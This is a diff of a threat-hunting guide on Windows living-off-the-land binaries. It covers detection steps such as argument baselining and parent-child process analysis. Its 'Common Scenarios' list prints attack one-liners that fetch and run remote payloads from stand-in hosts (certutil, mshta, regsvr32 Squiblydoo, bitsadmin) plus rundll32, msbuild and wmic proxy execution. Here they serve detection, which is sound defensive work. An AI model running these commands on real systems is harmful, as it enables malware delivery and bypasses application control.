@@ -51,7 +51,7 @@
 \li{\strong{Baseline Normal Usage}: Establish what normal LOLBin usage looks like in your environment by profiling command-line arguments, parent processes, and user contexts for each binary over 30 days.}
 \li{\strong{Hunt for Anomalous Arguments}: Search for LOLBins executed with unusual command-line arguments indicating abuse -- certutil with \code{\startverb -urlcache -decode -encode\stopverb}, mshta with URL arguments, rundll32 loading DLLs from temp/user directories, regsvr32 with \code{\startverb /s /n /u /i:URL\stopverb}.}
 \li{\strong{Analyze Parent-Child Relationships}: Identify unexpected parent processes spawning LOLBins -- for example, outlook.exe spawning mshta.exe, or winword.exe spawning certutil.exe indicates weaponized document delivery.}
-\li{\strong{Check Execution from Unusual Paths}: LOLBins executed from non-standard paths (copies placed in \%TEMP\%, user profile directories) suggest renamed binary abuse.}
+\li{\startverb **Check Execution from Unusual Paths**: LOLBins executed from non-standard paths (copies placed in %TEMP%, user profile directories) suggest renamed binary abuse.\stopverb}
 \li{\strong{Correlate with Network Activity}: Map LOLBin execution to outbound network connections (Sysmon Event ID 3) to identify download cradles and C2 callbacks.}
 \li{\strong{Score and Prioritize}: Rank findings by anomaly severity, combining suspicious arguments, unusual parent process, non-standard path, and network activity indicators.}
 }
@@ -166,12 +166,12 @@ tags:
 \subtree{
 \title{Common Scenarios}
 \ol{
-\li{\strong{Certutil Download Cradle}: \code{\startverb certutil.exe -urlcache -split -f http://malicious.com/payload.exe \%TEMP\%\startverb \payload\stopverb.exe\stopverb} used to download malware bypassing proxy filters.}
+\li{\startverb **Certutil Download Cradle**: `certutil.exe -urlcache -split -f http://malicious.com/payload.exe %TEMP%\payload.exe` used to download malware bypassing proxy filters.\stopverb}
 \li{\strong{Mshta HTA Execution}: \code{\startverb mshta.exe http://attacker.com/malicious.hta\stopverb} executing remote HTA files containing VBScript or JScript payloads.}
 \li{\strong{Regsvr32 Squiblydoo}: \code{\startverb regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll\stopverb} executing remote SCT files to bypass application whitelisting.}
-\li{\strong{Rundll32 DLL Proxy}: \code{\startverb rundll32.exe C:\startverb \Users\stopverb\startverb \user\stopverb\startverb \AppData\stopverb\startverb \Local\stopverb\startverb \Temp\stopverb\startverb \malicious\stopverb.dll,EntryPoint\stopverb} executing attacker DLLs via legitimate binary.}
-\li{\strong{MSBuild Inline Task}: \code{\startverb msbuild.exe C:\startverb \Temp\stopverb\startverb \malicious\stopverb.csproj\stopverb} executing C# code embedded in project files to bypass application control.}
-\li{\strong{BITS Transfer}: \code{\startverb bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\startverb \Temp\stopverb\startverb \update\stopverb.exe\stopverb} using BITS service for stealthy file download.}
+\li{\startverb **Rundll32 DLL Proxy**: `rundll32.exe C:\Users\user\AppData\Local\Temp\malicious.dll,EntryPoint` executing attacker DLLs via legitimate binary.\stopverb}
+\li{\startverb **MSBuild Inline Task**: `msbuild.exe C:\Temp\malicious.csproj` executing C# code embedded in project files to bypass application control.\stopverb}
+\li{\startverb **BITS Transfer**: `bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\Temp\update.exe` using BITS service for stealthy file download.\stopverb}
 \li{\strong{WMIC XSL Execution}: \code{\startverb wmic process list /format:evil.xsl\stopverb} executing JScript/VBScript from XSL stylesheets.}
 }
 }
